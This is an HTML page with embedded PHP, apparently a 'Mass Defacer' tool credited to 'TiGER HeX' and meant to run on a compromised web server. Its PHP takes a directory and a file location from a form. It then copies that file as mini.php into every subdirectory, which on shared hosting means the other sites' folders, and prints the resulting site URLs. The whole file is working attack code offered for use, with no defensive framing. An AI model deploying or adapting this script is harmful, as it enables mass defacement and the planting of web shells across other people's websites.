<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">

<head>
<style type="text/css">

div.end
{
    width:100%;
    background:#222;
}

* {
    padding:0;
    margin:0;
}

div.end *
{
    font-size:small;
}

</style>
<title>Mass Defacer Server Folder</title>
</head>

<body style="background-color: #1F1F1F">

<body style="background-color: #1F1F1F">

<center>
<style>
body { color: #FFCC00;
}
.style3 {
	font-size: 40pt;
}
.style31 {
	text-align: center;
}
.style32 {
	font-family: "Bell MT";
}
.style33 {
	color: #FF6000;
}
.style39 {
	font-size: 50pt;
}
.style41 {
	font-size: xx-large;
}
.style42 {
	font-weight: bold;
	font-size: x-large;
}
</style>
</head>
<p class="style3">

<span <ul>

	<span class="style32">
	<span class="style39">
<span style="font-weight: 700;" class="style33">
	<font class="hk" style="text-shadow: 2px 2px 3px rgb(0, 0, 0);">Mass Defacer | TiGER HeX</font></span></span></span>
	</span></p><br>
<span style="font-weight: 700;" class="style33">
	<font class="hk" style="text-shadow: 2px 2px 3px rgb(0, 0, 0);"><br>
<br>
</center>
<div class="style31">
<html>
<style>
body{margin:0px;font-style:normal;font-size:10px;color:#FFFFFF;font-family:Verdana,Arial;background-color:#3a3a3a;scrollbar-face-color: #303030;scrollbar-highlight-color: #5d5d5d;scrollbar-shadow-color: #121212;scrollbar-3dlight-color: #3a3a3a;scrollbar-arrow-color: #9d9d9d;scrollbar-track-color: #3a3a3a;scrollbar-darkshadow-color: #3a3a3a;}
input,
.kbrtm,select{background:#303030;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; height:18; border-left:1px solid #5d5d5d; border-right:1px solid #121212; border-bottom:1px solid #121212; border-top:1px solid #5d5d5d;}
button{background-color: #666666; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}
body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}  
.style45 {
	background-color: #000000;
}
</style>
<?php
error_reporting(0);
/*
Script: Mass Deface Script
*/
echo "<center><textarea rows='10' cols='65'>";
$defaceurl = $_POST['massdefaceurl'];
$dir = $_POST['massdefacedir'];
 
if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
                        if(filetype($dir.$file)=="dir"){
                                $newfile=$dir.$file."/mini.php";
                                echo "http://".$file."/mini.php"."\n";
                                if (!copy($defaceurl, $newfile)) {
                                        echo "";
                                }
                        }
        }
        closedir($dh);
    }
}
echo "</textarea></center>";
?>



	</div><br>
<form action='<?php basename($_SERVER['PHP_SELF']); ?>' method='post'>
<div class="style31">
[+] Main Directory [+] <br><br><input type='text' style='width: 300px;height: 25px;' value='<?php  echo getcwd() . "/"; ?>' name='massdefacedir'><br><br><br>
[+] Defacement Url [+] <br><br><input type='text' style='width: 300px;height: 25px;' name='massdefaceurl' value='<?php  echo getcwd() . "/tiger.html"; ?>'>
<br><br><br>
<center><input type='submit' style="width: 75px;height: 20px;" name='execmassdeface' value='Execute'></div></center>
	</form></td>